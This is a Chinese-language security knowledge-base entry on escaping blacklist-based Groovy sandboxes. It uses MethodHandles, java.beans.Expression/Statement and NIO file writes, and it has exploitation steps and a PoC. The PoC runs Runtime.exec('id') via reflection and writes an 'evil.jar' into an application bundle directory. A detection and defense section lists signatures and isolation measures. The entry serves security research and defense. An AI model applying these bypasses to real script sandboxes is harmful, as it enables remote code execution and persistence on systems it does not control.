---
id: binary-pwn-sandbox-escape-groovy-reflection-blacklist-gaps
title: Groovy 沙箱反射与黑名单盲区：MethodHandles、java.beans 与 NIO
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: groovy-sandbox-reflection-gap
aliases:
- MethodHandles 沙箱绕过
- java.beans.Expression 绕过
- Groovy 黑名单盲区
- NIO 文件写绕过
tags:
- groovy
- sandbox-escape
- reflection
- methodhandles
- javabeans
- nio
- blacklist
- jvm
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:42:20+08:00'
  notes: 已对照原文核对：MethodHandles.publicLookup().findVirtual、java.beans.Expression/Statement、Path.of+Files.write 三条盲区均在原文 0x06 列出，且明确仅在 ConnId 1.6.1.0 弱黑名单阶段有效、黑名单对齐后失效；confidence=medium 合理。PoC 未独立执行。
---

## 一句话结论

当 Groovy 黑名单覆盖不全时，`MethodHandles.publicLookup().findVirtual(...)`、`java.beans.Expression/Statement` 等“接收反射元信息、代为调用”的 JDK 工具可以绕过语法层检查直接派发 `Runtime.exec`；若命令执行被限制，`Path.of` + `Files.write` 还能提供任意文件写入这一替代危害面。这类盲区通常是拿到沙箱后的第一优先级探测目标。

## 原理

- 黑名单匹配的是 Groovy AST 改写后的第一跳签名。`MethodHandles.publicLookup().findVirtual(...).invoke(...)` 中，危险目标 `exec` 是运行期字符串/`MethodType` 参数，黑名单看到的只是 `MethodHandles.publicLookup`、`findVirtual`、`invoke` 等无害签名。
- `java.beans.Expression` 与 `Statement` 接收“目标对象 + 方法名 + 参数数组”，内部通过反射调用目标方法；`getValue()`/`execute()` 的签名本身不暴露最终调用的方法。
- `java.nio.file.Files.write` 提供直接的任意文件写原语；在没有命令执行或命令执行被拦时，可写入 WebShell、恶意 bundle、计划任务脚本或覆盖配置，形成替代利用面。
- 这类绕过依赖黑名单的覆盖度，而不是架构性缺陷；黑名单一旦把 `MethodHandles`、`java.beans`、NIO 全部列入即失效。因此它的价值主要在“弱黑名单/版本不对齐”阶段，以及作为低成本探测顺序的第一步。

## 触发条件

- 目标使用黑名单式 Groovy 沙箱，且黑名单未覆盖 `MethodHandles`、`java.beans`、`java.nio.file` 等类。
- 运行时为常规 JDK，`java.lang.invoke`、`java.beans`、`java.nio.file` 可用。
- 攻击者能提交并执行 Groovy 脚本。
- 若走文件写路线，应用进程对目标目录有写权限（如 Web 目录、bundle 目录、临时目录）。

## 利用步骤

1. 先做低成本探测：依次尝试 `Runtime`、`ProcessBuilder`、`GroovyShell`、`MethodHandles`、`java.beans`、NIO，观察哪些签名未被拦截。
2. 命令执行路线：用 `MethodHandles.publicLookup()` 获取 `Runtime` 的 `exec` 方法句柄并调用；或用 `java.beans.Expression/Statement` 对已有 `Runtime` 实例调用 `exec`。
3. 文件写路线：用 `Path.of(...)` + `Files.write(...)` 写入 JSP、JAR、脚本或配置。
4. 若目标目录可被 Web 容器或框架加载，再触发加载/执行，形成完整链。
5. 记录哪些类被黑名单覆盖，作为后续解释器逃逸/间接调用逃逸的输入。

## PoC

```groovy
// 1. MethodHandles：方法句柄反射调用 Runtime.exec
def rt = Runtime.getRuntime()
java.lang.invoke.MethodHandles.publicLookup()
    .findVirtual(rt.getClass(), 'exec',
        java.lang.invoke.MethodType.methodType(java.lang.Process.class, java.lang.String.class))
    .invoke(rt, 'id')

// 2. java.beans.Expression / Statement：内部反射派发
new java.beans.Expression(rt, 'exec', ['id'] as Object[]).getValue()
new java.beans.Statement(rt, 'exec', ['id'] as Object[]).execute()

// 3. NIO：任意文件写（命令执行不可用时的替代面）
def p = java.nio.file.Path.of('/opt/app/bundles/evil.jar')
java.nio.file.Files.write(p, payload)
```

说明：以上为结构复现，`payload` 需替换为实际字节；原文在 ConnId 1.6.1.0 弱黑名单阶段验证可行，黑名单对齐后这些入口会被拦截。PoC 未在目标环境执行。

## 变体与关联

- 变体：其他反射入口包括 `Class.forName` + `Method.invoke`、`Constructor.newInstance`、`ScriptEngine`、`Proxy`/`InvocationHandler`；本质都是“危险目标藏在运行期参数”。
- 变体：文件写目标可换成 Web 目录 JSP、应用 bundle 目录 JAR、计划任务/启动脚本、配置覆盖。
- 关联：[[binary-pwn-sandbox-escape-groovy-invokerhelper-indirect-dispatch]]（同属签名与目标分离，但 InvokerHelper 是 Groovy 运行时基础设施，无法靠黑名单闭合）；[[binary-pwn-sandbox-escape-groovy-interpreter-reinstantiation]]（解释器重入）。
- 关联：[[web-java-component-syncope-connector-script-rce]]（案例中 bundles 目录可写，文件写路线可落地恶意 bundle）。

## 检测与防御

- 检测：脚本中出现 `MethodHandles`、`publicLookup`、`findVirtual`、`MethodType`、`java.beans.Expression`、`java.beans.Statement`、`Path.of`、`Files.write` 等组合。
- 检测：脚本先探测多个危险类，再集中使用其中一个；同一来源短时间内提交多版 payload。
- 防御：黑名单需覆盖反射/元信息/NIO 类，但覆盖率不是安全边界；更可靠的是独立 JVM/容器隔离、最小文件权限、禁用不必要的脚本。
- 防御：应用 bundle/插件目录做完整性校验与签名，禁止运行期写入；Web 目录只读；对文件写入与类加载做运行时监控。
- 防御：对脚本提交做白名单 API 审查，限制可访问的类与方法，而不是仅依赖危险签名黑名单。
